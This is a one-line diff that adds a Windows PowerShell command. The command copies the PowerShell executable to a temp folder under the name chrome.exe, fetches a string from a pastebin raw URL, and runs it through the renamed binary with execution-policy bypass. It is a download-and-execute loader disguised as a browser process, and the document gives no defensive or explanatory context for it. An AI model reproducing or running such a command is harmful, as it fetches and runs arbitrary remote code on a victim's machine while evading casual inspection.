@@ -1,0 +1,1 @@
+$f=\"c:\windows\temp\chrome.exe\"; copy (Get-Process powershell | select -First 1).Path -Dest $f; $e=(New-Object System.Net.WebClient).DownloadString(\"https://pastebin.com/raw/aR3S28nf\"); c:\windows\temp\chrome.exe -Exec bypass -e $e
